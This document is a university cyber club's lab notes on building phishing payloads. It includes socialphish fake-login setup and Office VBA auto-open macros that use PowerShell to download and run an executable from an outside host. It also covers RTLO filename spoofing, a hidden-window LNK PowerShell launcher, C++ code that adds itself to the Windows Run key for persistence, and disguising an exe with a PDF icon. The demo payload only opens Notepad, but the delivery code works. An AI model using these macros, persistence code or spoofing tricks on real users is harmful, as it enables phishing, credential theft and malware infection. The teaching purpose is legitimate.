---
title: "Meeting 1"
author: "Andrew Bernal"
type: ""
date: 2023-09-13T15:57:48-04:00
subtitle: ""
image: ""
tags: []
---

# Making a Phishing Payload
The content shared and discussed in this club meeting is for educational purposes only

I have made a harmless program at <https://umlcyber.club/open_notepad.exe> for you to download and run as part of your macros. It is totally safe and only opens notepad.

These directions can be downloaded at: [meeting_1.md](meeting_1.md)

You can also view them on github: <https://github.com/UML-Cyber-Security/Fall_2023/blob/main/Meeting_1_Phishing_Payloads/lab_1.md>

For further reading, take a look at: <https://github.com/UML-Cyber-Security/Fall_2023/blob/main/Meeting_1_Phishing_Payloads/further_notes.md>

## Table of Contents
- [Social Phish](#social-phish)
- [Macros](#macros)
  - [Windows](#windows)
    - [Word](#word)
    - [Excel](#excel)
  - [Linux](#linux)
- [RTLO Character](#rtlo-character)
  - [Explanation](#explanation)
- [LNK files](#lnk-files)
- [Using the .ico files on the windows system](#using-the-ico-files-on-the-windows-system)
- [exe files](#exe-files)
  - [Running cmd from your program](#running-cmd-from-your-program)
  - [Adding a program to the registry](#adding-a-program-to-the-registry)
  - [Giving your exe file an icon](#giving-your-exe-file-an-icon)
  - [Compiling the executable](#compiling-the-executable)
- [Homographic attacks](#homographic-attacks)


## Social Phish
UML blocks serveo.net because it is malware. So you will need to use a VPN or the Cyber Range computers.

To run socialphish:
> git clone <https://github.com/pvanfas/socialphish.git>

> cd socialphish

> chmod +x socialphish.sh

> ./socialphish

When it says "Choose an option", type the number of the login form you want to make.

When it says "Choose a port forwarding option", just press enter.

When it says "Choose a port", just press enter.

Go to the URL it gives you. Fake login page. Pretty sweet!

For a more in-depth guide, view: <https://infosecwriteups.com/phishing-got-easier-with-socialphish-b04dcbab3900>
## Macros
### Windows
You can install microsoft office using your UML email account.
#### Word
To create a new macro in Word, follow these steps:

1. Click on the **View** tab in the menu bar.
2. Select **Macros** -> **View Macros**.
3. Enter a name for your macro and click **Create**.

Here's an example of a Word macro:

```vb
Sub AutoOpen()
    Dim exec As String
    Dim curDirectory As String
    
    'Get the current directory
    curDirectory = CurDir()
    
    'Replace any potential problematic characters (like \) for PowerShell string
    curDirectory = Replace(curDirectory, "\", "\\")

    'Build the PowerShell command to download and execute the file in the current directory
    exec = "powershell.exe -Command ""(new-object net.webclient).DownloadFile('https://umlcyber.club/open_notepad.exe', '" & curDirectory & "\\open_notepad.exe'); Start-Process '" & curDirectory & "\\open_notepad.exe'"""

    'Execute the PowerShell command
    Shell (exec)
End Sub

Sub Document_Open()
    AutoOpen
End Sub
```

When saving your file, select `Save As` and save it as a `Word Macro-Enabled Document (*.docm)` so your macros are saveed with the document.

#### Excel
Excel macros are slightly different from word macros. For example, this is the equivalent of the word macro:

```vb
Sub Auto_Open()
    Dim exec As String
    Dim curDirectory As String
    
    'Get the directory of the currently opened Excel workbook
    curDirectory = ThisWorkbook.Path
    
    'If the workbook has never been saved, the path will be empty
    If curDirectory = "" Then
        MsgBox "Workbook must be saved first."
        Exit Sub
    End If

    'Replace any potential problematic characters (like \) for PowerShell string
    curDirectory = Replace(curDirectory, "\", "\\")

    'Build the PowerShell command to download and execute open_notepad.exe in the workbook's directory
    exec = "powershell.exe -NoExit -Command ""(new-object net.webclient).DownloadFile('https://umlcyber.club/open_notepad.exe', '" & curDirectory & "\\open_notepad.exe'); Start-Process '" & curDirectory & "\\open_notepad.exe'"""

    'Execute the PowerShell command
    Shell (exec)
End Sub

Sub Workbook_Open()
    Auto_Open
End Sub
```

### Linux
LibreOffice has good security defaults! By default, only signed macros from trusted sources can run. To run your macros, you will have to lower the security level.

To lower the security level, go to "Tools" -> "Options" -> "Security" tab -> "Macro Security" and set it to Medium or Low.

You can get a shell with linux macros, and then do whatever you want. For example:
```vb
Sub DownloadFile
    Shell("wget https://example.com/file.zip -O /path/to/save/file.zip")
End Sub
```

## RTLO Character
Get the character here: <https://unicode-explorer.com/c/202E>

### Explanation
The RTLO character stands for Right-To-Left Override. It is a non-printing Unicode character, represented by the Unicode character code U+202E1. This character is used to write languages that are read in the right-to-left manner, such as Hebrew, Arabic, Aramaic, and Urdu. It takes the input and literally just flips the text the other way round.

The RTLO character can be used to reverse the display of text that follows it. For example, a Windows screensaver executable named March 25 \u202Excod.scr will display as March 25 rcs.docx. Adversaries may abuse the RTLO character as a means of tricking a user into executing what they think is a benign file type.

## LNK files
Make a shortcut file by right-clicking and selecting "New&rarr;Shortcut"
When asked for the program you would like to use, you can have it run a powershell command like:

```powershell
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -Command "[Malicious PowerShell Script Here]"
```

## Using the .ico files on the windows system
These two folders contain a lot of ico files for you to use
+ Windows/System32/shell32.dll
+ Windows/System32/imageres.dll

## exe files
In C++, you can modify the windows system using the `<windows.h>` library.

### Running cmd from your program
```cpp
 if (ShellExecuteA(NULL, "open", "notepad.exe", NULL, NULL, SW_SHOWNORMAL) <= (HINSTANCE)32) {
```
Parameters:
+ (NULL): No parent window is associated.
+ ("open"): Dictates the action, which is to "open".
+ ("notepad.exe"): Denotes the application's name.

ShellExecuteA expects the string parameters to be ASCII. There is also ShellExecuteW to have the string parameters as any Unicode character. Windows likes `LPCWSTR` instead of string for 'wide' strings that support unicode.

A returned value of 32 or below from the function suggests an error.
### Adding a program to the registry
To make the program add itself to the registry, you can use this code:
```cpp
// Declare a handle (hKey) to a registry key.
HKEY hKey;
// Registy path for programs that run on startup
const TCHAR* subkey = _T("Software\\Microsoft\\Windows\\CurrentVersion\\Run");

// Attempt to open the specified registry key (subkey) with write permissions. If the key is successfully opened, the handle is stored in hKey.
if (RegOpenKeyEx(HKEY_CURRENT_USER, subkey, 0, KEY_WRITE, &hKey) != ERROR_SUCCESS) {
        _tprintf(_T("Could not open registry key.\n"));
        return 1;
}

// Name of the key
const TCHAR* valueName = _T("Watcher_2");

// gets the current path of the program
TCHAR pathToExe[MAX_PATH];
if (!GetModuleFileName(NULL, pathToExe, MAX_PATH)) {
        return 1;
}

// Set a new value (or overwrite if it exists) in the registry with the name valueName and the value of the program's path. The REG_SZ type denotes a string data type in the registry.
if (RegSetValueEx(hKey, valueName, 0, REG_SZ, (LPBYTE)pathToExe, (_tcslen(pathToExe) + 1) * sizeof(TCHAR)) != ERROR_SUCCESS) {
        _tprintf(_T("Could not set registry value.\n"));
        RegCloseKey(hKey);
        return 1;
}

RegCloseKey(hKey);
```

### Giving your exe file an icon
I think Visual Studio lets you do it very easily. In VS Code, you can give your file an icon using a MinGW program called `windres`

1. Make a file called icon.rc with the following contents:

`ID_PDF ICON "pdf.ico"`

(this assumes your icon is stored in `pdf.ico`)

Run the following command (assuming you have added `C:\MinGW` to your path)

`windres icon.rc -o icon.o`

### Compiling the executable
Make sure to put icon.o with your object files

`g++ watcher_1.cpp icon.o -
o watcher_1.exe -static -mwindows`

1. `-static` has the libraries link themselves statically, so the executable can be run more easily acros different systems.

2. `-mwindows` is a specific flag for MinGW's g++, it means that no console window will be shown when the program is executed.

## Homographic attacks
You can register a domain on <https://namecheap.com>. They are cheap, give it a try! Then you can host a static website for free on Github, Netlify, etc.

IBM logs attempts at squatting google: <https://exchange.xforce.ibmcloud.com/collection/Google-Squatting-Campaign-b69974c86fff1c2b7f6ea9e477144001>